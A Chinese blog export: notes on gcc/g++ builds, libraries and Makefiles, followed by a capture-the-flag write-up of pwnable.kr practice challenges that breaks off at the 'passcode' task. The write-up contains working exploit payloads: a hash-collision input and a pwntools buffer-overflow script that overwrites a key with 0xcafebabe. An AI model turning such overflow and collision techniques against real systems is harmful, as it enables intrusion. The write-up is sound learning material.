<h2 id="3-Creating-a-Static-Library"><a href="#3-Creating-a-Static-Library" class="headerlink" title="3 Creating a Static Library"></a>3 Creating a Static Library</h2><ul>
<li><p>编译成 .o 的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c [.c] -o [自定义文件名] </span><br><span class="line">gcc -c [.c] [.c] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>编静态库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ar -r [lib自定义库名.a] [.o] [.o] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>链接成可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc [.c] [.a] -o [自定义输出文件名]</span><br><span class="line">gcc [.c] -o [自定义输出文件名] -l[库名] -L[库所在路径]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-Creating-a-Shared-Library"><a href="#4-Creating-a-Shared-Library" class="headerlink" title="4 Creating a Shared Library"></a>4 Creating a Shared Library</h2><blockquote>
<p>编译二进制.o文件</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c -fpic [.c/.cpp][.c/.cpp]... </span><br></pre></td></tr></table></figure>

<blockquote>
<p>编库</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared [.o][.o]... -o [lib自定义库名.so]</span><br></pre></td></tr></table></figure>

<ul>
<li>链接库到可执行文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc [.c/.cpp] -o [自定义可执行文件名]  -l[库名] -L[库路径] -Wl,-rpath=[库路径]</span><br></pre></td></tr></table></figure>

<h1 id="C-的编译"><a href="#C-的编译" class="headerlink" title="C++的编译"></a>C++的编译</h1><p>编译c++的相关后缀</p>
<blockquote>
<p>.a  静态库</p>
<p>.c .c++ .cc .cp .cpp .cxx </p>
<p>.h 头文件</p>
<p>.hpp 头文件</p>
<p>.ii 与处理文件</p>
<p>.o 目标文件</p>
<p>.so 动态库</p>
<p>.s 汇编语言文件</p>
</blockquote>
<h2 id="2-Compiling-C-1"><a href="#2-Compiling-C-1" class="headerlink" title="2 Compiling C++"></a>2 Compiling C++</h2><h3 id="2-1-Preprocessing-1"><a href="#2-1-Preprocessing-1" class="headerlink" title="2.1 Preprocessing"></a>2.1 Preprocessing</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -E helloworld.c</span><br><span class="line">g++ -E helloworld.c -o helloworld.i</span><br></pre></td></tr></table></figure>

<ul>
<li>-E 选项告诉编译器只进行预处理操作</li>
<li>-o 选项把预处理的结果输出到指定文件</li>
</ul>
<h3 id="2-2-Generating-Assembly-Language-1"><a href="#2-2-Generating-Assembly-Language-1" class="headerlink" title="2.2 Generating Assembly Language"></a>2.2 Generating Assembly Language</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -S helloworld.c</span><br><span class="line">g++ -S helloworld.c -o helloworld.s</span><br></pre></td></tr></table></figure>

<ul>
<li>-S 选项告诉编译器，进行预处理和编译成汇编语言操作</li>
</ul>
<p>每个平台对应的汇编语言的形式是不同的，例如有很多型号的开发板，有很多型号的 CPU </p>
<h3 id="2-3-Source-File-to-Object-File-1"><a href="#2-3-Source-File-to-Object-File-1" class="headerlink" title="2.3 Source File to Object File"></a>2.3 Source File to Object File</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c helloworld.c</span><br><span class="line">g++ -c helloworld.c -o harumph.o</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译多个 .c 文件</span></span><br><span class="line">g++ -c helloworld.c helloworld1.c helloworld2.c</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Single-Source-to-Executable-1"><a href="#2-4-Single-Source-to-Executable-1" class="headerlink" title="2.4 Single Source to Executable"></a>2.4 Single Source to Executable</h3><ul>
<li>注意：后面三个命令执行后并没有按编译过程出现 .i .s 或 .o 文件，并不意味着没有经历这些过程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ helloworld.c</span><br><span class="line">g++ helloworld.c -o howdy</span><br></pre></td></tr></table></figure>

<p>执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./可执行文件</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Multiple-Source-to-Executable"><a href="#2-5-Multiple-Source-to-Executable" class="headerlink" title="2.5 Multiple Source to Executable"></a>2.5 Multiple Source to Executable</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ g++ hellomain.c sayhello.c -o hello</span><br></pre></td></tr></table></figure>

<h2 id="3-Creating-a-Static-Library-1"><a href="#3-Creating-a-Static-Library-1" class="headerlink" title="3 Creating a Static Library"></a>3 Creating a Static Library</h2><ul>
<li><p>编译成 .o 的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c [.c] -o [自定义文件名] </span><br><span class="line">g++ -c [.c] [.c] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>编静态库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ar -r [lib自定义库名.a] [.o] [.o] ...</span><br></pre></td></tr></table></figure>
</li>
<li><p>链接成可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ [.c] [.a] -o [自定义输出文件名]</span><br><span class="line">g++ [.c] -o [自定义输出文件名] -l[库名] -L[库所在路径]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-Creating-a-Shared-Library-1"><a href="#4-Creating-a-Shared-Library-1" class="headerlink" title="4 Creating a Shared Library"></a>4 Creating a Shared Library</h2><ul>
<li><p>编译二进制.o文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -c -fpic [.c/.cpp][.c/.cpp]... </span><br></pre></td></tr></table></figure>
</li>
<li><p>编库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -shared [.o][.o]... -o [lib自定义库名.so]</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接动态库到可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ [.c/.cpp] -o [自定义可执行文件名]  -l[库名] -L[库路径] -Wl,-rpath=[库路径]</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><ul>
<li>GNU Make 官方网站：<a href="https://www.gnu.org/software/make/">https://www.gnu.org/software/make/</a></li>
<li>GNU Make 官方文档下载地址：<a href="https://www.gnu.org/software/make/manual/">https://www.gnu.org/software/make/manual/</a></li>
<li>Makefile Tutorial：<a href="https://makefiletutorial.com/">https://makefiletutorial.com/</a></li>
</ul>
<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><h3 id="1-基本格式"><a href="#1-基本格式" class="headerlink" title="1 基本格式"></a>1 基本格式</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">targets : prerequisties</span><br><span class="line">[tab键]command</span><br></pre></td></tr></table></figure>

<ul>
<li>target：目标文件，可以是 OjectFile，也可以是执行文件，还可以是一个标签（Label），对于标签这种特性，在后续的“伪目标”章节中会有叙述。</li>
<li>prerequisite：要生成那个 target 所需要的文件或是目标。</li>
<li>command：是 make 需要执行的命令，</li>
</ul>
<h3 id="2-Makefile-规则"><a href="#2-Makefile-规则" class="headerlink" title="2 Makefile 规则"></a>2 Makefile 规则</h3><ul>
<li>make 会在当前目录下找到一个名字叫 <code>Makefile</code> 或 <code>makefile</code> 的文件</li>
<li>如果找到，它会找文件中第一个目标文件（target），并把这个文件作为最终的目标文件</li>
<li>如果 target 文件不存在，或是 target 文件依赖的 .o 文件(prerequities)的文件修改时间要比 target 这个文件新，就会执行后面所定义的命令 command 来生成 target 这个文件</li>
<li>如果 target 依赖的 .o 文件（prerequisties）也存在，make 会在当前文件中找到 target 为 .o 文件的依赖性，如果找到，再根据那个规则生成 .o 文件</li>
</ul>
<h3 id="3-伪目标"><a href="#3-伪目标" class="headerlink" title="3 伪目标"></a>3 伪目标</h3><p>“伪目标” 不是一个文件，只是一个标签。我们要显示地指明这个 “目标” 才能让其生效</p>
<p>“伪目标” 的取名不能和文件名重名，否则不会执行命令</p>
<p>为了避免和文件重名的这种情况，我们可以使用一个特殊的标记 <code>.PHONY</code> 来显示地指明一个目标是“伪目标”，向 make 说明，不管是否有这个文件，这个目标就是 “伪目标”</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">.PHONY : clean</span><br></pre></td></tr></table></figure>

<p>只要有这个声明，不管是否有“clean”文件，要运行 “clean” 这个目标，只有”make clean” 这个命令</p>
<h2 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h2><p>变量在声明时需要给予初值，而在使用时，需要给在变量名前加上 <code>$</code> 符号，并用小括号 <code>()</code> 把变量给包括起来。</p>
<h3 id="1-变量的定义"><a href="#1-变量的定义" class="headerlink" title="1 变量的定义"></a>1 变量的定义</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">cpp := src/main.cpp </span><br><span class="line">obj := objs/main.o</span><br></pre></td></tr></table></figure>

<h3 id="2-变量的引用"><a href="#2-变量的引用" class="headerlink" title="2 变量的引用"></a>2 变量的引用</h3><ul>
<li>可以用 <code>()</code> 或 <code>&#123;&#125;</code></li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">cpp := src/main.cpp </span><br><span class="line">obj := objs/main.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span> : $&#123;cpp&#125;</span><br><span class="line">	@g++ -c <span class="variable">$(cpp)</span> -o <span class="variable">$(obj)</span></span><br><span class="line"></span><br><span class="line">compile : <span class="variable">$(obj)</span></span><br></pre></td></tr></table></figure>

<h3 id="3-预定义变量"><a href="#3-预定义变量" class="headerlink" title="3 预定义变量"></a>3 预定义变量</h3><ul>
<li><code>$@</code>: 目标(target)的完整名称</li>
<li><code>$&lt;</code>: 第一个依赖文件（prerequisties）的名称</li>
<li><code>$^</code>: 所有的依赖文件（prerequisties），以空格分开，不包含重复的依赖文件</li>
</ul>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">cpp := src/main.cpp </span><br><span class="line">obj := objs/main.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(obj)</span> : $&#123;cpp&#125;</span><br><span class="line">	@g++ -c <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line">	@echo <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line">compile : <span class="variable">$(obj)</span></span><br><span class="line">.PHONY : compile</span><br></pre></td></tr></table></figure>

<h2 id="Operator-amp-Symbols"><a href="#Operator-amp-Symbols" class="headerlink" title="Operator&amp;Symbols"></a>Operator&amp;Symbols</h2><h3 id="1-x3D"><a href="#1-x3D" class="headerlink" title="1 &#x3D;"></a>1 &#x3D;</h3><ul>
<li>简单的赋值运算符</li>
<li>用于将右边的值分配给左边的变量</li>
<li>如果在后面的语句中重新定义了该变量，则将使用新的值</li>
</ul>
<blockquote>
<p>示例</p>
</blockquote>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">HOST_ARCH   = aarch64</span><br><span class="line">TARGET_ARCH = <span class="variable">$(HOST_ARCH)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改了变量 a</span></span><br><span class="line">HOST_ARCH   = amd64</span><br><span class="line"></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">	@echo <span class="variable">$(TARGET_ARCH)</span></span><br></pre></td></tr></table></figure>

<h3 id="2-x3D"><a href="#2-x3D" class="headerlink" title="2 :&#x3D;"></a>2 :&#x3D;</h3><ul>
<li>立即赋值运算符</li>
<li>用于在定义变量时立即求值</li>
<li>该值在定义后不再更改</li>
<li>即使在后面的语句中重新定义了该变量</li>
</ul>
<blockquote>
<p>示例</p>
</blockquote>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">HOST_ARCH   := aarch64</span><br><span class="line">TARGET_ARCH := <span class="variable">$(HOST_ARCH)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改了变量 a</span></span><br><span class="line">HOST_ARCH := amd64</span><br><span class="line"></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">	@echo <span class="variable">$(TARGET_ARCH)</span></span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="3-x3D"><a href="#3-x3D" class="headerlink" title="3 ?&#x3D;"></a>3 ?&#x3D;</h3><ul>
<li>默认赋值运算符</li>
<li>如果该变量已经定义，则不进行任何操作</li>
<li>如果该变量尚未定义，则求值并分配</li>
</ul>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">HOST_ARCH  = aarch64</span><br><span class="line">HOST_ARCH ?= amd64</span><br><span class="line"></span><br><span class="line"><span class="section">debug:</span></span><br><span class="line">    @echo <span class="variable">$(HOST_ARCH)</span></span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="4-累加-x3D"><a href="#4-累加-x3D" class="headerlink" title="4 累加 +&#x3D;"></a>4 累加 +&#x3D;</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CXXFLAGS := -m64 -fPIC -g -O0 -std=c++11 -w -fopenmp</span><br><span class="line"></span><br><span class="line">CXXFLAGS += <span class="variable">$(include_paths)</span></span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="5"><a href="#5" class="headerlink" title="5 \"></a>5 \</h3><ul>
<li>续行符</li>
</ul>
<blockquote>
<p>示例</p>
</blockquote>
<figure class="highlight make"><table><tr><td class="code"><pre><span class="line">LDLIBS := cudart opencv_core \</span><br><span class="line">          gomp nvinfer protobuf cudnn pthread \</span><br><span class="line">          cublas nvcaffe_parser nvinfer_plugin </span><br></pre></td></tr></table></figure>

<p> </p>
<h3 id="6-与"><a href="#6-与" class="headerlink" title="6 * 与 %"></a>6 * 与 %</h3><ul>
<li><code>*</code>: 通配符表示匹配任意字符串，可以用在目录名或文件名中</li>
<li><code>%</code>: 通配符表示匹配任意字符串，并将匹配到的字符串作为变量使用</li>
</ul>
<h2 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h2>]]></content>
      <categories>
        <category>杂记</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable游记</title>
    <url>/2023/05/17/pwnable%E6%B8%B8%E8%AE%B0/</url>
    <content><![CDATA[<p>最近发现了两个刷题平台，一个是<a href="https://pwnable.kr/play.php">pwnable.kr</a>,一个<a href="https://pwnable.tw/challenge/">pwnable.tw</a>，准备当成娱乐项目做一下</p>
<h1 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h1><h2 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="Toddler’s Bottle"></a>Toddler’s Bottle</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">❯ ssh fd@pwnable.kr -p2222                                                                                 </span><br><span class="line">fd@pwnable.kr<span class="number">&#x27;</span>s password:</span><br><span class="line"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  <span class="string">&#x27; / |  D  )</span></span><br><span class="line"><span class="string">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span></span><br><span class="line"><span class="string">|  |  |  `  &#x27;</span>  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line"></span><br><span class="line">- Site admin : daehee87@khu.ac.kr</span><br><span class="line">- irc.netgarage.org:<span class="number">6667</span> / <span class="meta">#pwnable.kr</span></span><br><span class="line">- Simply type <span class="string">&quot;irssi&quot;</span> command to join IRC now</span><br><span class="line">- files under /tmp can be erased anytime. make your directory under /tmp</span><br><span class="line">- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal</span><br><span class="line">You have mail.</span><br><span class="line">Last login: Wed May <span class="number">17</span> <span class="number">06</span>:<span class="number">06</span>:<span class="number">40</span> <span class="number">2023</span> from <span class="number">95.91</span><span class="number">.223</span><span class="number">.13</span></span><br><span class="line">fd@pwnable:~$ ls #先查看文件</span><br><span class="line">fd  fd.c  flag</span><br><span class="line">fd@pwnable:~$ ls -sl</span><br><span class="line">total <span class="number">16</span></span><br><span class="line"><span class="number">8</span> -r-sr-x--- <span class="number">1</span> fd_pwn fd   <span class="number">7322</span> Jun <span class="number">11</span>  <span class="number">2014</span> fd</span><br><span class="line"><span class="number">4</span> -rw-r--r-- <span class="number">1</span> root   root  <span class="number">418</span> Jun <span class="number">11</span>  <span class="number">2014</span> fd.c</span><br><span class="line"><span class="number">4</span> -r--r----- <span class="number">1</span> fd_pwn root   <span class="number">50</span> Jun <span class="number">11</span>  <span class="number">2014</span> flag</span><br><span class="line">fd@pwnable:~$ ls -al</span><br><span class="line">total <span class="number">40</span></span><br><span class="line">drwxr-x---   <span class="number">5</span> root   fd   <span class="number">4096</span> Oct <span class="number">26</span>  <span class="number">2016</span> .</span><br><span class="line">drwxr-xr-x <span class="number">117</span> root   root <span class="number">4096</span> Nov <span class="number">10</span>  <span class="number">2022</span> ..</span><br><span class="line">d---------   <span class="number">2</span> root   root <span class="number">4096</span> Jun <span class="number">12</span>  <span class="number">2014</span> .bash_history</span><br><span class="line">-r-sr-x---   <span class="number">1</span> fd_pwn fd   <span class="number">7322</span> Jun <span class="number">11</span>  <span class="number">2014</span> fd</span><br><span class="line">-rw-r--r--   <span class="number">1</span> root   root  <span class="number">418</span> Jun <span class="number">11</span>  <span class="number">2014</span> fd.c</span><br><span class="line">-r--r-----   <span class="number">1</span> fd_pwn root   <span class="number">50</span> Jun <span class="number">11</span>  <span class="number">2014</span> flag</span><br><span class="line">-rw-------   <span class="number">1</span> root   root  <span class="number">128</span> Oct <span class="number">26</span>  <span class="number">2016</span> .gdb_history</span><br><span class="line">dr-xr-xr-x   <span class="number">2</span> root   root <span class="number">4096</span> Dec <span class="number">19</span>  <span class="number">2016</span> .irssi</span><br><span class="line">drwxr-xr-x   <span class="number">2</span> root   root <span class="number">4096</span> Oct <span class="number">23</span>  <span class="number">2016</span> .pwntools-cache</span><br><span class="line">fd@pwnable:~$ cat fd.c #阅读fd.c文件</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ./fd <span class="number">4660</span></span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!<span class="meta">#flag</span></span><br><span class="line">fd@pwnable:~$ <span class="built_in">exit</span></span><br><span class="line">logout</span><br><span class="line">Connection to pwnable.kr closed.</span><br></pre></td></tr></table></figure>

<p><strong>知识点</strong></p>
<p>一，</p>
<p>argc用来统计你运行程序时送给main函数的命令行参数的个数。</p>
<ul>
<li><p>argv[ ]: 字符串数组，用来存放指向你的字符串参数的指针数组，每一个元素指向一个参数.<br>argv[0] 指向程序运行的全路径名<br>argv[1] 指向在DOS命令行中执行程序名后的第一个字符串<br>argv[2] 指向执行程序名后的第二个字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;argc = %d\n&quot;</span>,argc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;argv[0] = %s, argv[1] = %s, argv[2] = %s \n&quot;</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ ./test love fanfan                                                                                       </span><br><span class="line">argc = 3</span><br><span class="line">argv[0] = ./test, argv[1] = love, argv[2] = fanfan </span><br><span class="line">~/pwn/study ·················································································· 08:15:41 PM </span><br><span class="line">❯ ./test love fanfan 1000years                                                                             </span><br><span class="line">argc = 4</span><br><span class="line">argv[0] = ./test, argv[1] = love, argv[2] = fanfan </span><br></pre></td></tr></table></figure></li>
</ul>
<p>二，</p>
<p>linux环境下的fd</p>
<p>fd &#x3D;&#x3D; 0为从标准输入读取<br>fd &#x3D;&#x3D; 1为从标准输出读取<br>fd &#x3D;&#x3D; 2为从标准错误输出读取</p>
<p>所以这道题的思路就是让fd&#x3D;0，然后在标准输出字符串的内容，将它读到buff里面，最后通过系统调用，直接输出flag</p>
<p>三，</p>
<p><strong>ls -al</strong></p>
<ol>
<li><p><strong>第一列</strong>共10位，第1位表示文档类型，<code>d</code>表示目录，<code>-</code>表示文件，<code>l</code>表示链接文件，<code>d</code>表示可随机存取的设备，如U盘等，<code>c</code>表示一次性读取设备，如鼠标、键盘等。后9位，依次对应三种身份所拥有的权限，身份顺序为：owner、group、others，权限顺序为：readable、writable、executable。如：<code>-r-xr-x---</code>的含义为<strong>当前文档是一个文件，拥有者可读、可执行，同一个群组下的用户，可读、可执行，其他人没有任何权限</strong>。</p>
</li>
<li><p><strong>第二列</strong>表示链接数，表示有多少个文件链接到inode号码。</p>
</li>
<li><p><strong>第三列</strong>表示拥有者</p>
</li>
<li><p><strong>第四列</strong>表示所属群组</p>
</li>
<li><p><strong>第五列</strong>表示文档容量大小，单位字节</p>
</li>
<li><p><strong>第六列</strong>表示文档最后修改时间，注意不是文档的创建时间哦</p>
</li>
<li><p><strong>第七列</strong>表示文档名称。以点(.)开头的是隐藏文档</p>
</li>
</ol>
<h3 id="col"><a href="#col" class="headerlink" title="col"></a>col</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ cat col.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123;</span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先满足输入字节数是20，每四个字节会被强制转换成 int*加起来，要求结果为0x21DD9EC</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="number">0x21DD09EC</span>)</span><br><span class="line"><span class="number">568134124</span></span><br><span class="line"><span class="number">568134124</span>/<span class="number">5</span></span><br><span class="line"><span class="number">113626824.8</span></span><br><span class="line"><span class="number">568134124</span>-<span class="number">4</span>*<span class="number">113626824</span><span class="comment">#1</span></span><br><span class="line"><span class="number">113626828</span><span class="comment">#2</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">113626824</span>)=<span class="string">&#x27;0x6c5cec8&#x27;</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">113626828</span>)=<span class="string">&#x27;0x6c5cecc&#x27;</span></span><br></pre></td></tr></table></figure>

<p>所以我们构造4个’0x6c5cec8’和一个0x6c5cecc,注意是小端序，而且会出现不可见字符难以打印，所以使用python的命令行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ python --version</span><br><span class="line">Python 2.7.12</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get flag</span><br><span class="line">col@pwnable:~$ ./col `python -c &quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;`</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure>

<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">buf = <span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>只要输入的overflowme覆盖掉key即可，只需要弄清楚多少个字节可以覆盖到key。</p>
<p>gdb调试</p>
<p>先在func下断点，<code>layout asm</code>进入反汇编窗口，单步到接收输入的地方。继续单步，输入AAAAAAAA，之后<code>x/30x $esp</code>查看栈空间，查看相差字节数</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>strings查看壳的类型，upx</p>
<p>在kali中脱壳</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ upx -d flag</span><br><span class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2020</span><br><span class="line">UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">    883745 &lt;-    335288   37.94%   linux/amd64   flag</span><br><span class="line"></span><br><span class="line">Unpacked 1 file.</span><br></pre></td></tr></table></figure>

<p>脱完壳放入ida中shift+F12就能在rodata段找到真正的flag</p>
<h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><p><strong>查看</strong></p>
<p>先通过ssh连接题目</p>
<p>源代码如下：</p>
